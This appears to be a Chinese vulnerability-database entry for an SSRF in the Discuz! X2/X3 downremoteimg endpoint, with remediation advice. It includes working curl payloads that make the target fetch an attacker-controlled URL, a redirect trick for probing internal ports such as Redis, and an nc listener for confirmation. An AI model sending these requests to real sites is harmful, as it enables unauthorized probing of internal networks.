---
id: DISCUZ-DOWNREMOTEIMG-SSRF
title: Discuz! X2/X3 前台 downremoteimg 远程图片下载 SSRF 漏洞
product: discuz
vendor: Discuz
version_affected: "Discuz! X2、X3（及 3.x 系列，downremoteimg 逻辑受影响版本）"
severity: HIGH
tags: [ssrf, 前台, 无需认证, 国产, 论坛]
fingerprint: ["Discuz", "discuz", "forum.php", "downremoteimg"]
---

## 漏洞描述

Discuz! 前台 `forum.php` 的 `mod=ajax&action=downremoteimg` 远程图片下载接口存在 SSRF 漏洞。该接口对 `message` 参数中的远程图片 URL 缺乏合法性校验，会直接发起服务端请求，可用于探测内网端口、访问内网服务。该漏洞为通用型，Discuz! X2/X3 等多个版本受影响，乌云平台与多篇公开分析均有记录。

**注意**：本条目只覆盖 downremoteimg SSRF；Discuz! 其他漏洞（任意文件删除、前台注入等）各自独立编号，不要合并。

## 影响版本

- Discuz! X2、X3（3.x 系列）

## 前置条件

- 目标为启用论坛发帖/远程图片下载功能的 Discuz! 站点
- 部分场景无需登录（无需条件）；部分版本需前台普通权限

## 利用步骤

1. 构造包含远程图片 BBCode 的 message 参数
2. 让目标服务器请求攻击者控制的地址或内网地址
3. 观察攻击者监听端/内网端口回连，确认 SSRF

## Payload

```bash
# message 中构造 [img] 远程图片，触发服务端下载
curl -s "http://target/forum.php?mod=ajax&action=downremoteimg&message=%5Bimg=1,1%5Dhttp://<你控制的地址>/1.jpg%5B/img%5D"
# 亦可配合 302 跳转探测内网端口：http://<你的地址>/redirect?to=http://127.0.0.1:6379
```

## 验证方法

```bash
# 仅限授权测试：在你控制的监听地址收到来自目标服务器的 HTTP 请求即存在 SSRF
nc -lvnp 8888
curl -s "http://target/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://<你的地址>:8888/1.jpg[/img]"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "discuz"
# 或直接探测接口
curl -s -o /dev/null -w "%{http_code}" "http://target/forum.php?mod=ajax&action=downremoteimg"
```

## 修复建议

1. 升级 Discuz! 至已修复版本
2. 对远程图片下载目标做协议白名单（仅 http/https）与内网地址/云元数据地址拦截
3. 对 downremoteimg 接口增加频率限制与登录校验

## 参考

- 公开分析（X2/X3 SSRF PoC）: https://www.cnblogs.com/yangxiaodi/p/6926450.html
- 内网探测实例: https://www.cnblogs.com/sonwnja/p/7966468.html
